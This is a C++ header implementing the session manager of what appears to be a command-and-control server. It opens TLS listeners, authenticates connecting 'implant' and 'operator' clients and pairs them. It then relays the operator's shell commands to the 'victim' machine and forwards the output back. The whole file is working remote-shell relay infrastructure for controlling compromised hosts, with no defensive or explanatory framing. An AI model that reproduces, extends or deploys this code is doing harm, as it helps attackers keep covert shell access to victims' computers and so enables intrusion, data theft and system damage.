#pragma once

#include "Logger.hpp"
#include "Config.hpp"
#include "SessionConnectionAuthenticator.hpp"
#include <SessionHandshake.hpp>

#include <Remote.hpp>
#include <Server.hpp>
#include <chrono>
#include <cstdint>
#include <map>
#include <memory>
#include <string>
#include <thread>
#include <mutex>

//--------------------------------
//
//--------------------------------
class SessionManager {
private:

    SessionManager() = default;
    ~SessionManager() = default;
    SessionManager(const SessionManager&) = delete;
    SessionManager& operator=(const SessionManager&) = delete;

    std::map<uint16_t, std::jthread> listeners;
    std::mutex mtx;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_operators;
    std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_victims;
    SessionConnectionAuthenticator* session_auth_ = nullptr;

    [[nodiscard]] bool authenticate_connection(cpppwn::Remote& conn, std::string& role_out) {
        if (session_auth_ == nullptr) {
            logger::error("Session authenticator is not configured");
            return false;
        }

        std::string role;
        const auto credentials = session_handshake::receive(conn);
        if (!credentials.has_value()) {
            logger::warn("Session handshake incomplete");
            return false;
        }

        role_out = credentials->role;
        if (!session_auth_->authenticate(credentials->role, credentials->username, credentials->password)) {
            logger::warn("Session authentication failed for role [{}] user [{}]", credentials->role, credentials->username);
            return false;
        }

        logger::info("Session authenticated for role [{}] user [{}]", credentials->role, credentials->username);
        return true;
    }

    void queue_authenticated_connection(
        std::unique_ptr<cpppwn::Remote>&& conn,
        int64_t port,
        const std::string& role) {
        if (role.starts_with(session_handshake::implant_role)) {
            if (waiting_operators.contains(port)) {
                bridge_sockets(std::move(conn), std::move(waiting_operators[port]));
                waiting_operators.erase(port);
            } else {
                waiting_victims[port] = std::move(conn);
                logger::info("Implant linked to Port: {}", port);
            }
            return;
        }

        if (role.starts_with(session_handshake::operator_role)) {
            if (waiting_victims.contains(port)) {
                bridge_sockets(std::move(waiting_victims[port]), std::move(conn));
                waiting_victims.erase(port);
            } else {
                conn->sendline(session_handshake::bridge_waiting);
                waiting_operators[port] = std::move(conn);
                logger::info("Operator waiting for Victim on Port: {}", port);
            }
        }
    }

public:
    //--------------------------------
    //
    //--------------------------------
    static SessionManager& instance() {
        static SessionManager instance;
        return instance;
    }

    void set_session_authenticator(SessionConnectionAuthenticator* authenticator) {
        session_auth_ = authenticator;
    }

    //--------------------------------
    //
    //--------------------------------
    bool start_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        if (listeners.contains(port)) return false;
        auto& config = Config::instance("server.db");

        listeners[port] = std::jthread([this, port, &config](std::stop_token stoken) {
            cpppwn::TlsConfig tls_conf{
                config.get<std::string>("victim_cert"),
                config.get<std::string>("victim_key")
            };
            cpppwn::Server server(port, tls_conf);

            while (not stoken.stop_requested()) {
                auto conn = server.accept();
                this->handle_new_connection(std::move(conn), port);
            }
        });
        return true;
    }

    //--------------------------------
    //
    //--------------------------------
    void handle_new_connection(std::unique_ptr<cpppwn::Remote>&& conn, int64_t port) {
        std::thread([this, conn_ptr = std::move(conn), port]() mutable -> void {
            try {
                std::string role;
                if (!authenticate_connection(*conn_ptr, role)) {
                    return;
                }

                std::lock_guard lock(mtx);
                queue_authenticated_connection(std::move(conn_ptr), port, role);
            } catch (const std::exception& e) {
                logger::warn("Connection handler failed: {}", e.what());
            }
        }).detach();
    }

    //--------------------------------
    //
    //--------------------------------
    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& victim, std::unique_ptr<cpppwn::Remote>&& operator_conn) {
        operator_conn->sendline(session_handshake::bridge_ready);

        std::thread([vic = std::move(victim), op = std::move(operator_conn)]() -> void {
            logger::success("Bridging established between Implant and Operator.");

            while (vic->is_alive() && op->is_alive()) {
                const auto cmd = trim_string(op->recvline());
                logger::debug("Shell Command From Operator: [{}]", cmd);
                vic->sendline(cmd);

                // forward output size
                const auto output_size = trim_string(vic->recvline());
                logger::debug("Output Size: [{}]", output_size);
                op->sendline(output_size);

                // forward output data
                const auto out_size = std::atol(output_size.c_str());
                if (out_size > 0) {
                    const auto output = trim_string(vic->recv(out_size));
                    logger::debug("Output from Victim: [{}]", output);
                    op->send(output);
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(5));
            }
            logger::warn("Bridge closed: One or both parties disconnected.");
        }).detach();
    }

    //--------------------------------
    //
    //--------------------------------
    void stop_listener(uint16_t port) {
        std::lock_guard lock(mtx);
        listeners.erase(port); // jthread cleans itself up
    }
};
